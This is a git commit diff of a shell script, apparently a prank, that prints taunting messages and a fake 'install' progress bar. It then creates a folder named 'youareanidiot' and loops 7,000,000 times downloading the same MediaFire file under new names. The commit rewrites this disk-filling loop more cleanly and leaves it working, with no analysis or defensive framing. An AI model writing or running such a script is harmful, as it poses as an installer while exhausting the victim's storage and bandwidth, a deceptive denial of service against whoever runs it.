7c91356e3b80e2d617333968f769a34932d18a1c
Camtuong153 <cammanhtuong@gmail.com>
2026-04-23 16:07:48 +0700

    ??
    ??

--- ??.sh
+++ ??.sh
@@ -1,17 +1,22 @@
 #!/bin/bash
 clear
-echo -e "\e[1;37m not OPEN file!!!\e[0m"
+echo -e "\e[1;31m not OPEN file!!!\e[0m"
 sleep 1
-clear
-echo -e "\e[1;37m you not press..[0m"
+echo -e "\e[1;31m you not press..\e[0m"
 sleep 1
-clear
-echo -e "\e[1;37m hello!!\e[0m"
+echo -e "\e[1;31m hello!!\e[0m"
 sleep 1
-clear
-for i in {1..7000000}; do echo -ne "\e[1;37m1. install [${i}] pack\r[0m"; done
-mkdir youareanidiot
+
+for i in {1..100}; do 
+    echo -ne "\e[1;37m. install [${i}%] pack\e[0m\r"
+    sleep 0.05
+done
+echo -e "\n"
+
+mkdir -p youareanidiot
 cd youareanidiot
-for i in {1..7000000}; do curl  -s -o idiot_$i 'https://www.mediafire.com/file/8u3ptcr0riczx0k/00n0.txt/file'
-      echo -ne "\e[1;31mDownloading: $i / 7000000\e[0m\r" ; done
-clear
+
+for i in {1..7000000}; do 
+    curl -s -o idiot_$i 'https://www.mediafire.com/file/8u3ptcr0riczx0k/00n0.txt/file'
+    echo -ne "\e[1;31mDownloading: $i / 7000000\e[0m\r"
+done
